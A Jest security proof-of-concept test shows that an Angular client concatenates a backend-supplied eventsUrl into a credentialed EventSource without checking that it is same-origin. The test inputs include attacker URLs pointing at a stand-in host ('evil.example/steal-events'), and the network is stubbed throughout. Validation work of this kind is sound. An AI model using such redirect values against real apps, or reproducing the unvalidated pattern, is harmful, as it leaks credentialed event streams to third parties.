/**
 * [SECURITY-POC] — CF-4: backend-supplied `eventsUrl` concatenated into a
 * credentialed EventSource without relative-path validation
 * (independent validation, Exploit Validator, SAA-1632).
 *
 * Finding:  CF-4 (SAA-1629 white-box candidate, Low / hardening):
 *           GraphRunEventClient.open builds
 *           `new this.sourceCtor(`${this.backendUrl}${descriptor.eventsUrl}?afterSequence=${offset}`, { withCredentials: true })`
 *           (src/diagrams/components/graph/runs/GraphRunEventClient.ts:221-226).
 *           `eventsUrl` comes from the backend's 202 create response and is only
 *           checked to be a non-empty string (GraphRunClient.ts:172-182) — never
 *           checked to be a same-origin RELATIVE path.
 *
 * Affected files (pinned revision for-angular abb26f50, v0.12.5):
 *   - src/diagrams/components/graph/runs/GraphRunEventClient.ts:221-226 (sink)
 *   - src/diagrams/components/graph/runs/GraphRunClient.ts:172-182 (no shape validation)
 *
 * Safe effects asserted (no network — GRAPH_RUN_EVENT_SOURCE is a stub ctor):
 *   - The URL handed to the EventSource constructor is the raw, unvalidated
 *     concatenation; no origin/path check is performed by the client.
 *   - A protocol-relative eventsUrl against a same-origin base ('/') yields a
 *     CROSS-ORIGIN credentialed EventSource URL (withCredentials: true).
 *   - An absolute cross-origin eventsUrl is concatenated verbatim into an
 *     invalid URL (the code performs no validation; fail-closed only by accident
 *     of URL parsing).
 * Note: exploitation requires a compromised/malicious backend response (the
 * backend is the trust anchor), hence classification Low/hardening — the POC
 * proves the missing validation, not an end-to-end exfiltration.
 */

import { TestBed } from '@angular/core/testing';
import { HttpClient } from '@angular/common/http';
import { GraphRunEventClient } from '../../src/diagrams/components/graph/runs/GraphRunEventClient';
import { GRAPH_RUN_EVENT_SOURCE } from '../../src/diagrams/components/graph/runs/GraphRunEventClient';
import { GRAPH_BACKEND_URL } from '../../src/diagrams/components/graph/execution/GraphExecutionService';

class FakeEventSource {
  static captured: { url: string; init?: EventSourceInit }[] = [];
  constructor(url: string, init?: EventSourceInit) {
    FakeEventSource.captured.push({ url, init });
  }
}

const noopSubscriber = {
  onEvent: jest.fn(),
  onTerminal: jest.fn(),
  onError: jest.fn(),
};

describe('[SECURITY-POC] CF-4 eventsUrl concatenated into credentialed EventSource without validation', () => {
  let client: GraphRunEventClient;

  beforeEach(() => {
    FakeEventSource.captured = [];
    TestBed.configureTestingModule({
      providers: [
        { provide: GRAPH_RUN_EVENT_SOURCE, useValue: FakeEventSource },
        { provide: GRAPH_BACKEND_URL, useValue: '' },
        { provide: HttpClient, useValue: { get: jest.fn() } },
      ],
    });
    client = TestBed.inject(GraphRunEventClient);
  });

  it('protocol-relative eventsUrl from the backend response yields a CROSS-ORIGIN credentialed SSE URL', () => {
    client.connect(
      { runId: 'r1', eventsUrl: '//evil.example/steal-events' },
      noopSubscriber
    );
    expect(FakeEventSource.captured).toHaveLength(1);
    expect(FakeEventSource.captured[0].url).toBe('//evil.example/steal-events?afterSequence=0');
    expect(FakeEventSource.captured[0].init?.withCredentials).toBe(true);
  });

  it('absolute cross-origin eventsUrl is concatenated verbatim — no same-origin check is performed', () => {
    client.connect(
      { runId: 'r2', eventsUrl: 'https://evil.example/steal-events' },
      noopSubscriber
    );
    expect(FakeEventSource.captured[0].url).toBe(
      'https://evil.example/steal-events?afterSequence=0'
    );
  });

  it('CONTROL: a well-formed relative eventsUrl is passed through unchanged (expected benign behavior)', () => {
    client.connect(
      { runId: 'r3', eventsUrl: '/graph/runs/r3/events' },
      noopSubscriber
    );
    expect(FakeEventSource.captured[0].url).toBe('/graph/runs/r3/events?afterSequence=0');
    expect(FakeEventSource.captured[0].init?.withCredentials).toBe(true);
  });
});
